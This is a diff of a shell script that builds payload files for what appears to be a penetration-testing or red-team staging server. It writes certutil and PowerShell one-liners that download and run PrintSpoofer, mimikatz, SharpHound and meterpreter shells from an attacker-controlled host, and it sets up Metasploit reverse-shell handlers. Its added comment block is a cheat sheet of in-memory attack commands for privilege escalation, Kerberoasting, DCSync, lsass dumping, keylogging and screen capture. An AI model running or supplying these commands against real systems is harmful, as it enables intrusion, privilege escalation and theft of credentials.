@@ -112,25 +112,19 @@ echo '#POWERSHELL' >> http/payloads/${BESTAND}_${PORT}.txt
 echo '[powershellplaceholder]' >> http/payloads/${BESTAND}_${PORT}.txt
 python3 powershell.py ${IP} ${PORT} ${BESTAND}_${PORT}.txt
 
-
 #http/commands uitbreiden
 echo '#Downloads' >> http/payloads/${BESTAND}_${PORT}.txt
-echo 'certutil -urlcache -split -f http://${IP}/tools/PrintSpoofer64.exe print.exe' >> http/payloads/${BESTAND}_${PORT}.txt
-echo 'certutil -urlcache -split -f http://${IP}/tools/mimi/mimikatz.exe mimi.exe' >> http/payloads/${BESTAND}_${PORT}.txt
-
-
-
-echo 'certutil -urlcache -split -f http://${IP}/tools/SharpHound.exe sharphound.exe' >> http/payloads/${BESTAND}_${PORT}.txt
-
-echo 'certutil -urlcache -split -f http://${IP}/payloads/shell_meth.exe meth.exe' >> http/payloads/${BESTAND}_${PORT}.txt
-
+echo "certutil -urlcache -split -f http://${IP}/tools/PrintSpoofer64.exe print.exe" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "certutil -urlcache -split -f http://${IP}/tools/mimi/mimikatz.exe mimi.exe" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "certutil -urlcache -split -f http://${IP}/tools/SharpHound.exe sharphound.exe" >> http/payloads/${BESTAND}_${PORT}.txt
+echo "certutil -urlcache -split -f http://${IP}/payloads/shell_meth.exe meth.exe" >> http/payloads/${BESTAND}_${PORT}.txt
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\tasks\print.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/mimi/mimikatz.exe','c:\windows\\tasks\mimi.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\tasks\sharphound.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/shell_meth.exe','c:\windows\\tasks\meth.exe')" >> http/payloads/${BESTAND}_${PORT}.txt
 
-echo "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST ${localnic};set LPORT ${PORT};run -j;" > http/commands/msf_https
-echo "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST ${localnic};set LPORT ${PORT};run -j;" > http/commands/msf_tcp
+echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_https \n set LHOST ${localnic}\n set LPORT ${PORT} \n run -j" > http/commands/msf_https
+echo "use multi/handler \n set payload windows/x64/meterpreter/reverse_tcp \n set LHOST ${localnic} \n set LPORT ${PORT} \n run -j;" > http/commands/msf_tcp
 echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/PrintSpoofer64.exe print.exe && print.exe -i -c cmd" > http/commands/printspoofer
 echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/mimikatz.exe mimi.exe" > http/commands/mimikatz
 echo "cd C:\Windows\\\tasks && certutil -urlcache -f http://${IP}/tools/SharpHound.exe sharphound.exe" > http/commands/sharphound
@@ -139,9 +133,90 @@ echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\\tasks\print.exe') && c:\windows\\\tasks\print.exe -i -c cmd" > http/commands/printerspoofer
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/mimi/mimikatz.exe','c:\windows\\\tasks\mimi.exe')" > http/commands/psmimikatz
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\\tasks\sharphound.exe')" > http/commands/pssharphound
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\\tasks\sharphound.exe') && c:\windows\\\tasks\sharphound.exe -CollectionMethods All" > http/commands/pssharphound
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/shell_meth.exe','c:\windows\\\tasks\meth.exe')" > http/commands/psmeth
 echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/shell_meth.exe','c:\windows\\\tasks\meth.exe') && c:\windows\\\tasks\meth.exe" > http/commands/psmethrun
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/methtcp.exe','c:\windows\\\tasks\methtcp.exe')" > http/commands/psmethtcp
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/payloads/methtcp.exe','c:\windows\\\tasks\methtcp.exe') && c:\windows\\\tasks\meth.exe" > http/commands/psmethtcprun
 
+
+# Domain Recon
+## ShareFinder - Look for shares on network and check access under current user context & Log to file
+#powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"
+
+## Import PowerView Module
+#powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')"
+
+## Invoke-BloodHound for domain recon
+#powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"
+
+## ADRecon script to generate XLSX file of domain properties
+#powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/sense-of-security/ADRecon/master/ADRecon.ps1')"
+
+
+# Priv Esc
+## PowerUp script
+#powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”
+
+## cPasswords in sysvol
+echo "findstr /S cpassword %logonserver%\sysvol\*.xml \n findstr /S cpassword $env:logonserver\sysvol\*.xml" > http/commands/cpassword
+
+
+## Inveigh
+### Start inveigh using Basic Auth - logging to file
+#powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}//Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y -HTTPAuth Basic"
+
+### Start inveigh in silent mode (no popups)
+#powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y -WPADAuth anonymous"
+
+## Invoke-HotPotato Exploit
+#powershell.exe -nop -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}/Tater.ps1');invoke-Tater -Command 'net localgroup Administrators user /add'"
+
+## Bypass UAC and launch PowerShell window as admin
+#powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"
+
+## Invoke-Kerberoast with Hashcat Output
+#powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"
+
+
+# Reg Keys
+## Enable Wdigest
+#reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1 /f
+
+## Check always install elevated
+echo "reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer \n reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" > http/command/install_elevated
+
+
+
+# Mimikatz
+## Invoke Mimikatz
+#powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}//Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
+
+## Import Mimikatz Module
+#powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http://${IP}/Invoke-Mimikatz.ps1')"
+
+## Perform DcSync attack
+#Invoke-Mimikatz -Command '"lsadump::dcsync /domain:demodomain /user:sqladmin"'
+
+## Invoke-MassMimikatz
+#powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"
+
+## Manual Procdump for offline mimikatz
+#.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+
+# Useful Scripts/Commands
+## Use Windows Debug api to pause live processes
+#powershell.exe -nop -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/Pause-Process/master/pause-process.ps1');Pause-Process -ID 1180;UnPause-Process -ID 1180;"
+
+## Import Powersploits invoke-keystrokes
+#powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1')"
+
+## Import Empire's Get-ClipboardContents
+#powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ClipboardContents.ps1')"
+
+## Import Get-TimedScreenshot
+#powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/obscuresec/PowerShell/master/Get-TimedScreenshot')"
 
 
 
